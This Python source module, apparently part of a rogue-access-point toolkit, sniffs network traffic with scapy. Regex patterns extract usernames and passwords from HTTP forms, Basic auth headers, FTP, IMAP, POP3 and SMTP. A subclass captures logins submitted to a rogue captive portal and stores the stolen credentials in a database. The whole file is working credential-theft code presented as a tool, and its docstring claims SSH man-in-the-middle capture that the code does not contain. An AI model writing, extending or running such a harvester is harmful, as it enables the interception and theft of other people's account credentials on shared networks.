"""
Credential Harvester Module
───────────────────────────
Harvests credentials from various sources:
  - HTTP form submissions (username/password)
  - Basic/Digest authentication headers
  - FTP credentials
  - SMTP/IMAP login attempts
  - SSH credentials via man-in-the-middle
  - Captive portal authentication
"""

import time
import re
import base64
from http.server import BaseHTTPRequestHandler
from collections import defaultdict

from scapy.all import IP, TCP, Raw, sniff, ARP
from scapy.layers.http import HTTPRequest, HTTP

from .config import CAPTIVE_PORTAL_PORT, NETWORK_GW_IP, log


class CredentialHarvester:
    """
    Harvests credentials from network traffic.
    Captures HTTP form data, auth headers, FTP, SMTP, IMAP, and SSH attempts.
    """

    def __init__(self, interface, output_db=None):
        self.interface = interface
        self.db = output_db
        self._credentials = []
        self._running = False
        self._patterns = self._compile_patterns()
        self._http_requests = defaultdict(list)

    def _compile_patterns(self):
        """Compile regex patterns for credential extraction."""
        return {
            "http_form": re.compile(r'(?:username|user|email|login|user_name|u|uid)[\s]*=[\s]*["\']?([^&"\']+)', re.I),
            "http_password": re.compile(r'(?:password|pass|pwd|passwd|pin)[\s]*=[\s]*["\']?([^&"\']+)', re.I),
            "basic_auth": re.compile(r'Authorization:\s*Basic\s+(\S+)', re.I),
            "ftp_user": re.compile(r'USER\s+(\S+)', re.I),
            "ftp_pass": re.compile(r'PASS\s+(\S+)', re.I),
            "smtp_auth": re.compile(r'AUTH\s+(\w+)', re.I),
            "smtp_user": re.compile(r'(?:MAIL FROM|RCPT TO|AUTH)\s+<?(\S+@\S+)>?', re.I),
            "imap_auth": re.compile(r'A\d+\s+LOGIN\s+"([^"]+)"\s+"([^"]+)"', re.I),
            "pop3_user": re.compile(r'USER\s+(\S+)', re.I),
            "pop3_pass": re.compile(r'PASS\s+(\S+)', re.I),
        }

    def _extract_credentials(self, payload, protocol="HTTP"):
        """Extract credentials from payload."""
        creds = []
        payload_str = payload.decode(errors='ignore') if isinstance(payload, bytes) else str(payload)

        # HTTP form credentials
        if protocol == "HTTP":
            user_match = self._patterns["http_form"].search(payload_str)
            pass_match = self._patterns["http_password"].search(payload_str)
            if user_match and pass_match:
                creds.append({
                    "protocol": "HTTP Form",
                    "username": user_match.group(1),
                    "password": pass_match.group(1),
                    "source": "form_data"
                })

            # Basic auth
            auth_match = self._patterns["basic_auth"].search(payload_str)
            if auth_match:
                try:
                    decoded = base64.b64decode(auth_match.group(1)).decode()
                    if ":" in decoded:
                        user, pwd = decoded.split(":", 1)
                        creds.append({
                            "protocol": "HTTP Basic Auth",
                            "username": user,
                            "password": pwd,
                            "source": "auth_header"
                        })
                except Exception:
                    pass

        # FTP credentials
        elif protocol == "FTP":
            user_match = self._patterns["ftp_user"].search(payload_str)
            pass_match = self._patterns["ftp_pass"].search(payload_str)
            if user_match:
                creds.append({
                    "protocol": "FTP",
                    "username": user_match.group(1),
                    "password": pass_match.group(1) if pass_match else "",
                    "source": "ftp_command"
                })

        # IMAP credentials
        elif protocol == "IMAP":
            match = self._patterns["imap_auth"].search(payload_str)
            if match:
                creds.append({
                    "protocol": "IMAP",
                    "username": match.group(1),
                    "password": match.group(2),
                    "source": "imap_login"
                })

        # POP3 credentials
        elif protocol == "POP3":
            user_match = self._patterns["pop3_user"].search(payload_str)
            pass_match = self._patterns["pop3_pass"].search(payload_str)
            if user_match:
                creds.append({
                    "protocol": "POP3",
                    "username": user_match.group(1),
                    "password": pass_match.group(1) if pass_match else "",
                    "source": "pop3_command"
                })

        # SMTP credentials
        elif protocol == "SMTP":
            user_match = self._patterns["smtp_user"].search(payload_str)
            auth_match = self._patterns["smtp_auth"].search(payload_str)
            if user_match and auth_match:
                creds.append({
                    "protocol": f"SMTP-{auth_match.group(1)}",
                    "username": user_match.group(1),
                    "password": "",
                    "source": "smtp_auth"
                })

        return creds

    def _packet_handler(self, pkt):
        """Process packets for credential harvesting."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        tcp = pkt[TCP]
        payload = bytes(pkt[Raw].load)

        # Determine protocol based on port
        if tcp.dport == 80 or tcp.sport == 80:
            protocol = "HTTP"
        elif tcp.dport == 21 or tcp.sport == 21:
            protocol = "FTP"
        elif tcp.dport == 143 or tcp.sport == 143:
            protocol = "IMAP"
        elif tcp.dport == 110 or tcp.sport == 110:
            protocol = "POP3"
        elif tcp.dport == 25 or tcp.sport == 25:
            protocol = "SMTP"
        else:
            return

        # Extract credentials
        creds = self._extract_credentials(payload, protocol)
        for cred in creds:
            cred["timestamp"] = time.time()
            cred["src_ip"] = pkt[IP].src
            cred["dst_ip"] = pkt[IP].dst
            cred["src_port"] = tcp.sport
            cred["dst_port"] = tcp.dport

            self._credentials.append(cred)
            self._log_credential(cred)

    def _log_credential(self, cred):
        """Log credential to console and database."""
        # Redact password in log output (show first char + asterisks)
        password = cred.get('password', '')
        redacted = password[0] + '*' * (len(password) - 1) if len(password) > 1 else '***'
        log.critical(
            f"CREDENTIAL HARVESTED: [{cred['protocol']}] "
            f"{cred['username']}:{redacted} "
            f"from {cred['src_ip']}:{cred['src_port']}"
        )

        if self.db:
            self.db.log_credential(
                cred["src_ip"], "", cred["username"], cred["password"],
                f"{cred['protocol']} - {cred['src_ip']}:{cred['src_port']}"
            )

    def start(self):
        """Start credential harvesting."""
        self._running = True
        log.info(f"Starting credential harvester on {self.interface}")

        sniff(
            iface=self.interface,
            prn=self._packet_handler,
            store=False,
            stop_filter=lambda x: not self._running
        )

    def stop(self):
        """Stop credential harvesting."""
        self._running = False
        log.info(f"Harvester stopped. Total credentials: {len(self._credentials)}")

    def get_credentials(self):
        """Return all harvested credentials."""
        return self._credentials

    def get_unique_credentials(self):
        """Return unique credentials (deduplicated)."""
        seen = set()
        unique = []
        for cred in self._credentials:
            key = (cred["protocol"], cred["username"], cred["src_ip"])
            if key not in seen:
                seen.add(key)
                unique.append(cred)
        return unique

    def get_stats(self):
        """Return harvesting statistics."""
        unique = self.get_unique_credentials()
        by_protocol = defaultdict(int)
        for cred in self._credentials:
            by_protocol[cred["protocol"]] += 1

        return {
            "total_credentials": len(self._credentials),
            "unique_credentials": len(unique),
            "by_protocol": dict(by_protocol),
            "running": self._running
        }


class CaptivePortalHarvester(CredentialHarvester):
    """
    Specialized harvester for captive portal credentials.
    Works with the rogue AP's captive portal.
    """

    def __init__(self, interface, portal_port=80):
        super().__init__(interface)
        self.portal_port = portal_port
        self._portal_requests = []

    def _packet_handler(self, pkt):
        """Handle captive portal traffic."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        tcp = pkt[TCP]
        if tcp.dport != self.portal_port and tcp.sport != self.portal_port:
            return

        payload = bytes(pkt[Raw].load)

        # Check for POST to login
        if b"POST /login" in payload or b"POST /" in payload:
            # Extract form data
            try:
                _, _, body = payload.partition(b"\r\n\r\n")
                form_data = body.decode(errors='ignore')

                # Parse form fields
                username = ""
                password = ""

                # Simple form parsing
                for line in form_data.split("&"):
                    if "=" in line:
                        key, value = line.split("=", 1)
                        key = key.lower()
                        value = value.replace("+", " ")

                        if "user" in key or "name" in key:
                            username = value
                        elif "pass" in key:
                            password = value

                if username or password:
                    cred = {
                        "protocol": "Captive Portal",
                        "username": username,
                        "password": password,
                        "source": "portal_form",
                        "timestamp": time.time(),
                        "src_ip": pkt[IP].src,
                        "dst_ip": pkt[IP].dst
                    }
                    self._credentials.append(cred)
                    self._log_credential(cred)
            except Exception as e:
                log.warning(f"Portal parsing error: {e}")

        super()._packet_handler(pkt)